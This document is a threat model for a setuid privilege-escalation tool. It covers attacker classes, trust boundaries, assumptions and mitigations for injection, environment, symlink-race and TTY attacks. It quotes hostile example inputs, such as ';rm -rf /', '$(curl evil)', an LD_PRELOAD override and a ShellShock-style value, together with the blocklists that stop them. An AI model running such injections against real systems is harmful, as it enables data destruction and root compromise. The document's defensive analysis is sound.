# Shakti Threat Model

Structured for an external security reviewer. Pairs with
[`overview.md`](overview.md) (security model + auth flow) and the
ADRs under [`docs/adr/`](../adr/).

## Scope

Shakti is a setuid-root (or CAP_SETUID/CAP_SETGID-granted) privilege
escalation tool. It accepts a command from an unprivileged caller,
authorises it against a TOML policy, authenticates the caller, and
execs the command as a target user (typically root).

This document covers shakti 0.2.x (cyrius port). The Rust 0.1.x line
is preserved in `rust-old/` for reference and is not in scope.

## Attacker classes

### A1 — Local unprivileged user (primary)

Has a login shell or exec path on the system with a real UID > 0. Can
read world-readable files, modify their own home, and invoke shakti.
Cannot modify root-owned filesystem objects.

**Goal**: execute arbitrary code as root, or as a user whose policy
they are not permitted to assume.

### A2 — Compromised authorised user

A local user who has a legitimate policy entry granting them a
specific allowed command set. Has ever-typed their correct password
at shakti's prompt in the current session (so may have a valid
timestamp cache).

**Goal**: escape their policy's command set, or extend access beyond
their TTY / timestamp TTL.

### A3 — Co-located unprivileged process

Runs under the same real UID as A1 but through a different entry
point (e.g. a compromised network daemon). Can inspect the user's
process table, `/proc/<pid>/*`, attach ptrace before shakti calls
`setuid`.

**Goal**: intercept shakti's authentication material, or corrupt its
runtime state before privilege drop.

### A4 — Filesystem-level attacker (shared-writable paths)

Controls a world-writable directory shakti touches — typically `/tmp`
under a malicious user's symlink-race scenario. Cannot write to
`/etc`, `/var/run/agnos/sudo/`, or other root-owned paths.

**Goal**: coerce shakti into writing to a root-owned file of the
attacker's choosing via a TOCTOU race.

### A5 — Hostile policy author

A root-equivalent actor who wrote the policy file. Out of scope in
the traditional sense (they're already root), but the linter
(`--check`) actively helps this class write safer policy; see
[ADR-003](../adr/003-argument-level-command-matching.md) and the
policy linter output in `src/policy.cyr:lint_policy`.

### Out of scope

- **A6 — Kernel-level attacker**: owns the box. Shakti assumes the
  kernel correctly enforces `setuid`, `setgid`, file permissions,
  and `O_NOFOLLOW` symlink rejection. No mitigations apply.
- **A7 — Physical access**: cold-boot, hardware key logger, bus
  sniffing. Not addressed.
- **A8 — Upstream supply chain**: a compromised cyrius toolchain
  binary could emit a backdoor at compile time. Mitigated externally
  via reproducible cc5 self-host and `cyrius deps --lock` (noted in
  [`dependency-watch.md`](../development/dependency-watch.md); the
  per-shakti lockfile is empty today — the toolchain is the trust
  root).

## Trust boundaries

```
Attacker surface  →  [CLI] → [Policy] → [Authz] → [Auth] → [TS] → [Env] → [Exec]  →  Root-privileged child
                      ───────────────── Shakti enforces ──────────────────
```

Each gate is independently enforced. A failure of one must not
silently bypass the others.

| Boundary | What's trusted | What's untrusted |
|---|---|---|
| CLI input | argv byte strings, argv length | content — any byte sequence possible |
| Caller identity | `getuid()` / `getgid()` kernel return | the name in `/etc/passwd` (read-only), but the uid is canonical |
| Policy file | `/etc/agnos/sudoers.toml` root-owned, non-world-writable | content is trusted once ownership/mode pass |
| Fragment dir | `/etc/agnos/sudoers.d/` root-owned, non-world-writable dir; each `.toml` fragment root-owned + non-world-writable | same checks applied to every fragment individually |
| Timestamp file | `/var/run/agnos/sudo/<user>[:<tty>]` root-owned, non-symlink | mtime is trusted iff ownership passes |
| Target child | inherits setuid/setgid identity, sanitised env, closed fds | anything the target does post-exec is the target's responsibility |

## Assumption register

Security of shakti depends on these assumptions. Violation of any
invalidates the corresponding threat-class mitigations.

| # | Assumption | If violated |
|---|---|---|
| S1 | `/etc/passwd` and `/etc/group` are writable only by root | caller identity + target lookup can be forged |
| S2 | `/usr/bin/su` behaves canonically: reads password from stdin, runs `-c true`, exits 0 iff password matched | authentication can succeed with wrong password, or be bypassed entirely |
| S3 | Kernel enforces `setuid(uid)` semantics — if caller wasn't already uid 0, the syscall rejects any uid the process is not permitted to assume | privilege drop could fail silently and leave elevated uid intact |
| S4 | Kernel enforces `O_NOFOLLOW` atomically: the open(2) call rejects symlinks without a stat/open race window | timestamp TOCTOU comes back ([ADR-001](../adr/001-timestamp-o-nofollow.md)) |
| S5 | `close_range(3, -1, 0)` is available (Linux ≥ 5.9) | fd sanitisation silently no-ops; inherited fds leak to target |
| S6 | No other setuid binary in the caller's PATH can be coerced into writing to `/var/run/agnos/sudo/` | timestamp can be forged by a sibling setuid tool |
| S7 | The policy file's `include_dir` (if set) points at a root-owned, non-world-writable directory | unprivileged fragment injection |
| S8 | CLOCK_REALTIME is monotonic enough that an attacker with root can't already have set the clock backward to extend a timestamp TTL | timestamp TTL check becomes meaningless |
| S9 | Cyrius toolchain produces correct setuid-safe code (no use-after-free, no uninitialised memory leak to child) | lower-level corruption of any surface above |
| S10 | Target user's `/etc/passwd` home and shell are correct | `SUDO_USER` / `HOME` / `SHELL` env may be wrong, but this is informational only — security doesn't depend on it |

## Threats and mitigations

### T1 — Shell injection via command name (A1)

**Attack**: pass `shakti ';rm -rf /'` or `shakti '$(curl evil)'`.

**Mitigation**: `validate_command` in `src/validate.cyr` rejects
`; | & ` $ ( ) { } < > !` in argv[0] before it reaches policy or
exec. `_has_shell_meta` covers all 12 shell metacharacters. Command
args are passed as separate argv entries to `execve` — never
concatenated into a shell string.

**Residual risk**: if a consumer of the library passes argv to a
shell wrapper (bash `-c`, sh `-c`), it re-introduces injection.
Consumer guide explicitly warns against this; shakti's own exec path
is shell-free.

**Test coverage**: `validate.tcyr:t_validate_rejects_metachars`,
`fuzz.tcyr:fuzz_validate_command` (2500 iters with adversarial byte
menu including all 12 metachars).

### T2 — Environment-variable injection (A1)

**Attack**: `LD_PRELOAD=/tmp/evil.so shakti mycmd` or
`BASH_FUNC_cd%%=()$(malicious) shakti bash`.

**Mitigation**: three layers in `src/env.cyr` — prefix blocking of
`LD_*` and `BASH_FUNC_*` (ShellShock), explicit blocklist of 52
shell/locale/interpreter names, allow-list default. See
[ADR-004](../adr/004-env-sanitization-strategy.md).

Implementation uses cyrius's `lib/hashmap` (O(1) lookup per env
var). Hot path benchmark: 33 µs per `sanitize_environment` call
across a typical env size of ~30 vars.

**Residual risk**: a new interpreter language ships with a dangerous
env var the blocklist doesn't know about. Mitigated by the
allow-list default — only `TERM`, `LANG`, `TZ`, `DISPLAY`,
`XAUTHORITY`, etc. pass through unless policy `env_keep` opts in.

**Test coverage**: `env.tcyr` (63 cases, includes `LD_FUTURE_EXPLOIT`
as a forward-compat check + `BASH_FUNC_*` catch-all).

### T3 — Timestamp file tampering (A4 symlink race, A3 ptrace)

**Attack**: create a symlink at `/var/run/agnos/sudo/<user>` pointing
at `/etc/shadow` between shakti's stat and write; shakti writes a
zero-length file over shadow under root.

**Mitigation**: `update_timestamp` uses
`O_NOFOLLOW | O_CREAT | O_TRUNC | O_WRONLY` in a single `open()`
call. Kernel atomically rejects the symlink — no check-then-write
window. Directory itself is verified root-owned and
non-world-writable at `_shk_ensure_ts_dir`. Per-TTY isolation means
a stolen timestamp only grants access within one session.

See [ADR-001](../adr/001-timestamp-o-nofollow.md).

**Residual risk**: S4 (kernel enforcement of `O_NOFOLLOW`). No
application-level mitigation possible.

**Test coverage**: `timestamp.tcyr:t_reject_symlink`,
`fragments.tcyr:t_fragments_world_writable_dir`.

### T4 — Authorization bypass via command-arg elision (A1)

**Attack**: policy forbids `deny_commands = ["/usr/bin/systemctl stop firewall"]`,
attacker runs `shakti -- /usr/bin/systemctl stop firewall`. Authz
receives only the binary path; deny rule never matches.

**Mitigation**: `check_authorization` receives the **full command
string including arguments**. `command_matches` has an explicit
trailing-` *` wildcard and falls back to path-only matching only for
directory-glob and basename patterns where argument comparison
doesn't apply. See [ADR-003](../adr/003-argument-level-command-matching.md).

**Test coverage**: `policy.tcyr:t_authz_deny_precedence_over_all`,
`policy.tcyr:t_authz_deploy_denied`,
`fuzz.tcyr:fuzz_command_matches` (2500 iters × boolean-return
invariant check).

### T5 — Path traversal in usernames (A1)

**Attack**: `shakti -u '../etc/passwd'` attempts to make the
timestamp path resolve outside the directory.

**Mitigation**: `validate_username` in `src/validate.cyr` rejects
empty, `.`, `..`, any string containing `/`, and any null byte
before it reaches filesystem layers. `validate_username` is called
at both `update_timestamp` and `invalidate_timestamp` entry.

**Test coverage**: `validate.tcyr:t_username_path_traversal`,
`fuzz.tcyr:fuzz_validate_username` (2500 iters × property: "if
returns OK, the string has no `/`, is not `.`, is not `..`").

### T6 — Password exposure in memory (A3 ptrace, A6 kernel leak)

**Attack**: attach ptrace to shakti during authentication, scan its
heap, extract the plaintext password.

**Mitigation**: `_prompt_and_authenticate` declares
`secret var pbuf[1024]` (cyrius v5.3.5). The compiler synthesises a
zeroise prologue wired into every return path — successful auth,
MAX_AUTH_ATTEMPTS exhaustion, empty input, any exception. Between
attempts, an explicit `memset(&pbuf, 0, PW_BUF_CAP)` clears residue
for the in-loop window. The password never survives past
`_prompt_and_authenticate`'s return.

Terminal echo is disabled via `TCSETS` with `ECHO` cleared before
prompting, restored regardless of subsequent outcome.

Signals `SIGINT`, `SIGQUIT`, `SIGTSTP` are masked during the auth
window so Ctrl-C can't leave a partial state.

**Residual risk**: the kernel pipe buffer holding the password en
route to `su` is not under shakti's control. `su` reads from fd 0
once and proceeds. Between fork and exec, the password is
momentarily in the pipe buffer. Mitigated by the short window and
su's canonical behaviour (S2).

**Test coverage**: absence of a crash in `auth.tcyr`; the zeroise is
an emit-level guarantee (cyrius v5.3.5 tests this generically).

### T7 — Fd leak to target process (A2)

**Attack**: open a sensitive fd in the caller (e.g. open
`/dev/kmem` or inherit a socket via systemd) before invoking shakti;
the target inherits it.

**Mitigation**: `syscall(SYS_CLOSE_RANGE, 3, -1, 0)` closes every fd
above stderr before `execve`. Error ignored — on kernels < 5.9 the
syscall returns -ENOSYS and fds stay open (see S5).

**Residual risk**: S5. Old kernels. For a modern AGNOS install this
is non-issue; for legacy deployments, document required kernel
version.

### T8 — Policy file replacement (A1 if /etc is world-writable; A5 if policy author is hostile)

**Attack**: replace `/etc/agnos/sudoers.toml` with a permissive
policy that grants the attacker `ALL` commands.

**Mitigation**: `load_policy` stats the file first — rejects if
`uid != 0` or mode has the world-writable bit set or path is a
symlink (via the non-world-writable + root-owned checks). Same
gates apply to every `include_dir` fragment. See
[dependency-watch.md](../development/dependency-watch.md) assumption
S1 + S7.

### T9 — TTY hijack / timestamp reuse (A2, A3)

**Attack**: read another user's timestamp file; use their
authenticated session to run commands.

**Mitigation**: per-TTY isolation. `timestamp_path(user)` produces
`/var/run/agnos/sudo/<user>:<tty>` (sanitised from
`/dev/pts/<N>`-style paths). A user authenticated on `pts/3` cannot
use a timestamp from `pts/7`. If the caller has no TTY, the path is
`/var/run/agnos/sudo/<user>` with no TTY suffix — still root-owned
and uid-scoped.

TTL is configurable per-policy (`timestamp_ttl` in `[defaults]`);
default 300 seconds.

**Residual risk**: A3 can ptrace a shakti process mid-session and
extract the already-validated state. Mitigation: the uid drop
happens early; anything post-drop runs as the target user, not as
root. An attacker who can ptrace a target-uid process has already
won the target-uid battle.

### T10 — Co-located setuid binary that writes to timestamp dir (A1 + assumption S6 violation)

**Attack**: another setuid binary on the system accepts a path
argument and writes to it. Attacker uses it to create a root-owned
timestamp file.

**Mitigation**: none at the shakti layer. This is assumption S6 —
system-level hardening (remove unnecessary setuid bits, audit all
setuid binaries). Part of AGNOS's broader minimum-setuid policy,
not shakti's responsibility.

### T11 — TIOCSTI terminal-input injection (A2, lateral uid move)

**Attack**: `shakti -u otheruser /bin/cmd` invokes the target as
`otheruser` while inheriting the caller's tty. If `otheruser` is
hostile, they can use the `TIOCSTI` ioctl against the shared tty
(which they now have an open fd to, via inherited stdin) to inject
synthetic keystrokes back into the caller's shell after shakti exits.
Same class as OpenDoas CVE-2023-28339 and util-linux runuser
CVE-2016-2779.

**Mitigation today**: partial. Shakti does not currently allocate
a new PTY for the target process. The caller-to-target uid
direction (typical invocation: caller → root) is less severely
exposed than the root→caller direction because the target is the
elevated side; but lateral uid moves (developer → service-account)
are real usage and do expose this.

**Residual risk**:
1. On Linux ≥ 6.2, operators can disable `TIOCSTI` system-wide via
   the `legacy_tiocsti` sysctl or `LEGACY_TIOCSTI` build option.
   Document this in the operations guide; rely on it as a kernel-
   level backstop.
2. Longer-term: allocate a new pty per invocation via `openpty` +
   proxy I/O. Tracked under "Session logging / I/O recording" in
   v0.3+ roadmap. PTY allocation naturally defeats TIOCSTI
   injection because the parent never holds a writable fd against
   the caller's original tty.

**Test coverage**: none today (the CVE class has no unit-testable
equivalent without pty setup). Absence-of-mitigation documented in
[`audit/2026-04-20-external-cve-review.md`](../audit/2026-04-20-external-cve-review.md)
OpenDoas CVE-2023-28339 row.

## Non-goals

- **Rate limiting across invocations.** Each shakti invocation gets
  MAX_AUTH_ATTEMPTS (3) password tries, but a scripted attacker can
  spawn a new shakti process per password guess. Rate limiting
  across sessions is a future (v0.3+) consideration — not currently
  blocked, just not scoped.
- **Protection of the target session post-exec.** Once shakti calls
  `execve`, the target process runs with target-uid permissions.
  Anything it does (read secrets, spawn children, open network)
  is the target user's responsibility.
- **Kernel-level confidentiality.** Against A6 no userspace
  mitigation applies.
- **Replay of the full command history.** Audit logs record the
  authorised command (`src/audit.cyr:audit_log`), not stdin/stdout
  of the resulting process. Session logging is a v0.3+ roadmap item.

## Open gaps (tracked)

| Gap | Where tracked | Blocks v1.0? |
|---|---|---|
| LDAP / sssd group resolution | `docs/development/roadmap.md` port-regressions + [ADR-005](../adr/005-identity-backend-port-to-cyrius.md) | Yes — revisit cyrius 5.5.x |
| Real PAM via `dlopen("libpam.so.0")` | port-regressions + `src/auth.cyr` comment | Yes — revisit cyrius 5.5.x |
| External security audit | roadmap v1.0 Criteria | Yes — this document is input |
| Consumer integration (argonaut/agnoshi/daimon/ark) | roadmap v1.0 Criteria | Yes — consumer-side work |

## Related documents

- [`audit/2026-04-20-external-cve-review.md`](../audit/2026-04-20-external-cve-review.md)
  — maps this threat model's classes against known CVEs in sudo /
  doas / su / PAM / NSS. Every T-entry above has a companion section
  there with the specific CVE references that exemplify the attack
  class. Updated together.
- [`overview.md`](overview.md) — architectural view of the same
  surface (modules, auth flow, policy format).

## Review process

This document is updated whenever:

1. A new threat class or attack path is identified.
2. An assumption is added, removed, or reclassified.
3. A mitigation is added, weakened, or removed.
4. An ADR lands that changes the security surface.

Change history lives in git log for this file. External reviewers
should expect this document to be the single structured handoff,
cross-referenced from the ADRs and the `overview.md`.
